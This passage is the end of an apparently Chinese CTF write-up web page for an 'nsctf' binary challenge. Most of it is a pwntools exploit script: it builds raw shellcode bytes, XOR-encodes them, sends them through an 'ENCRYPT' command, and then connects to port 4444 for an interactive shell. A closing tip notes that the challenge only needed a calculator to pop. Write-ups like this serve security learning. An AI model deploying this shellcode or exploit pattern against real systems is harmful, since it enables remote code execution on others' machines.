+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\xff\xd5</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># xor encode payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> xor(table, payload, cut<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;right&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;ENCRYPT </span><span style="color:#e6db74">{}{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(p16(len(payload)), payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># close the connection</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># interact with shell</span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(HOST, <span style="color:#ae81ff">4444</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;enjoy :)&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>interactive(prompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p><img src="nsctf-bin-1500-3.png" alt=""></p>
+<p>小 tip：这题做题是只要求弹出计算器，所以没必要构造完整的 ROP，利用程序自带的开新进程就可以达到题目要求。</p>
+
+    </section>
+</article>
+</main>
+    </body>
+</html>
